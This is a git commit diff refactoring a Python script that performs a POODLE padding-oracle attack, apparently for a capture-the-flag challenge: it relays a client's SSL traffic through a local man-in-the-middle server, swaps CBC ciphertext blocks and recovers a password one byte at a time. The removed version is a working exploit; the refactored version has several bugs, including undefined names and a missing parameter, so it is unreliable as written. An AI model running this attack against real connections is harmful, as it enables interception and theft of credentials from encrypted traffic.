7cc2c4e3e5509e3c8f4760d3d6c77e7cac99a55c
Alvaro Gutierrez Perez <alvarogzp@users.noreply.github.com>
2015-03-22 19:24:46 +0100

    Refactorized solution object-oriented

--- solution.py
+++ solution.py
@@ -2,61 +2,148 @@
 
 import socket
 import sys
-import scapy.all as scapy
-sys.path.append("scapy-ssl_tls/src/scapy/layers")
-from ssl_tls import *
 
-CHALLENGE_ENDPOINT = ("localhost", 4747)
+BLOCK_LENGTH = 16 # AES-256
+
+MITM_SERVER_ADDRESS = ("127.0.0.1", 4747)
 ORIGIN_CLIENT = "C"
 ORIGIN_SEPARATOR = "-"
+RESPONSE_SUCCESSFUL = "ok\n"
 
-BLOCK_LENGTH = 16;
-BODY_LAMBDA = 6
+PADDING_LAMBDA = 6 # To make request end on block boundary
 
-TLS_CONTENT_TYPE_APPLICATION_DATA = dict(((v, k) for k, v in TLS_CONTENT_TYPES.iteritems()))["application_data"]
+PADDING_CHAR = "a"
+DECRYPT_BLOCK_FROM_LAST = 4 # Decrypt the 4th block counting from last
 
-a_count = 30
 
-while True:
-	s = socket.create_connection(CHALLENGE_ENDPOINT)
-	f = s.makefile(bufsize=0)
-	post_as = "a" * a_count
-	post_body_as = "a" * (BLOCK_LENGTH - ((a_count + BODY_LAMBDA) % BLOCK_LENGTH))
-	#print post_as, post_body_as
-	f.write('post("/%s", "%s");\n' % (post_as, post_body_as))
-
-	l = f.readline()
-	while l:
-		tls_record = None
-		splitted = l.split(ORIGIN_SEPARATOR, 1)
-		if len(splitted) > 1:
-			origin, encoded_data = splitted
-			if origin == ORIGIN_CLIENT:
-				data = encoded_data.decode("base64")
-				tls_record = TLSRecord(data)
-				if tls_record.content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
-					encrypted_blocks = tls_record.length / BLOCK_LENGTH
-					if len(tls_record.load) > tls_record.length:
-						load_excess = tls_record.load[tls_record.length:]
-						tls_record.load = tls_record.load[:tls_record.length]
-						second_tls_record = TLSRecord(load_excess)
-						tls_record = tls_record/second_tls_record
-						encrypted_blocks = second_tls_record.length / BLOCK_LENGTH
-					#print encrypted_blocks
-					#print origin, tls_record.show()
-					#print second_tls_record.length
-					# <POODLE>
-					data_minus_last_block = data[:-BLOCK_LENGTH]
-					first_block = data[-BLOCK_LENGTH*encrypted_blocks:-BLOCK_LENGTH*(encrypted_blocks-1)]
-					second_block = data[-BLOCK_LENGTH*(encrypted_blocks-1):-BLOCK_LENGTH*(encrypted_blocks-2)]
-					second_to_last_block = data_minus_last_block[-BLOCK_LENGTH:]
-					data = data_minus_last_block + second_block
-					l = origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"
-					# </POODLE>
-			f.write(l)
+class PoodlePasswordDecrypter:
+	def __init__(self):
+		self.password = ""
+		self.got_password = False
+	
+	def run(self):
+		while not self.got_password:
+			char = self.try_decipher_one_char(padding_chars)
+			if char is not None:
+				self.process_new_char(char)
+				padding_chars += 1
+	
+	def try_decipher_one_char(self, padding_chars):
+		mitm = MitmConnection()
+		mitm.connect()
+		mitm.send_initial_request(padding_chars)
+		mitm.forward_loop()
+		return mitm.decrypted_char
+	
+	def process_new_char(self, char):
+		if self.is_end_of_password(char):
+			self.got_password = True
 		else:
-			print chr(((BLOCK_LENGTH - 1) ^ ord(second_to_last_block[-1]) ^ ord(first_block[-1])))
-			a_count -= 1
-		l = f.readline()
+			self.password += char
+	
+	def is_end_of_password(self, char):
+		return char == "\r"
 
-print "END"
+
+class MitmConnection:
+	def __init__(self):
+		self.block_exchanger = None
+		self.decrypted_char = None
+	
+	def connect(self):
+		self.socket = socket.create_connection(MITM_SERVER_ADDRESS)
+		self.rfile = self.socket.makefile('rb', bufsize=-1)
+		self.wfile = self.socket.makefile('wb', bufsize= 0)
+	
+	def send_initial_request(self, num_padding_chars):
+		body_chars = PADDING_CHAR * num_padding_chars
+		url_chars = PADDING_CHAR * self.__get_num_chars_to_make_request_fill_last_block(num_padding_chars)
+		self.wfile.write('post("/%s", "%s");\n' % (url_chars, body_chars))
+	
+	def __get_num_chars_to_make_request_fill_last_block(self, num_padding_chars):
+		return (BLOCK_LENGTH - ((num_padding_chars + PADDING_LAMBDA) % BLOCK_LENGTH))
+	
+	def forward_loop(self):
+		packet = self.get_mitm_packet()
+		while packet:
+			send_packet = self.process_mitm_packet(packet)
+			self.send_mitm_packet(send_packet)
+			packet = self.get_mitm_packet()
+	
+	def get_mitm_packet(self):
+		return self.rfile.readline()
+	
+	def process_mitm_packet(self, packet):
+		if packet == RESPONSE_SUCCESSFUL:
+			self.decrypted_char = self.block_exchanger.get_decrypted_char()
+		else:
+			mitm_packet = MitmPacket(packet)
+			mitm_packet.process()
+			if mitm_packet.block_exchanger:
+				self.block_exchanger = mitm_packet.block_exchanger
+			return mitm_packet.send_packet
+	
+	
+	def send_mitm_packet(self, packet):
+		if packet:
+			self.wfile.write(packet)
+
+
+class MitmPacket:
+	def __init__(self, packet):
+		self.packet = packet
+		self.send_packet = packet
+		self.block_exchanger = None
+	
+	def process(self):
+		self.process_mitm_packet(packet)
+	
+	def process_mitm_packet(self, packet):
+		origin = self.__get_origin(packet)
+		if origin == ORIGIN_CLIENT:
+			self.process_client_packet(packet)
+	
+	def process_client_packet(self, packet):
+		data = self.__get_data(packet)
+		tls_content_type = self.__get_tls_content_type(data)
+		if tls_content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
+			self.process_client_application_data(data)
+	
+	def process_client_application_data(data):
+		self.block_exchanger = PoodleBlockExchanger(data)
+		new_data = self.block_exchanger.exchange_blocks()
+		self.send_packet = self.__reasemble_packet(ORIGIN_CLIENT, new_data)
+	
+	def __get_origin(self, packet):
+		return packet[0]
+	
+	def __get_data(self, packet):
+		return packet[2:].decode("base64")
+	
+	def __get_tls_content_type(self, data):
+		return data[0]
+	
+	def __reasemble_packet(self, origin, data):
+		return origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"
+
+
+class PoodleBlockExchanger:
+	def __init__(self, data):
+		self.data = data
+	
+	def exchange_blocks(self):
+		data_minus_last_block = self.data[:-BLOCK_LENGTH]
+		block_to_inject = self.data[-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST):-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST-1)]
+		self.previous_block = self.data[-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST+1):-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST)]
+		self.second_to_last_block = data_minus_last_block[-BLOCK_LENGTH:]
+		return data_minus_last_block + block_to_inject
+	
+	def get_decrypted_char(self):
+		last_block_last_byte_plaintext = (BLOCK_LENGTH - 1)
+		second_to_last_block_last_byte_ciphertext = ord(self.second_to_last_block[-1])
+		previous_block_last_byte_ciphertext = ord(self.previous_block[-1])
+		return chr(last_byte_plaintext ^ second_to_last_block_last_byte_ciphertext ^ previous_block_last_byte_ciphertext)
+
+
+if __name__ == "__main__":
+	PoodlePasswordDecrypter().run()
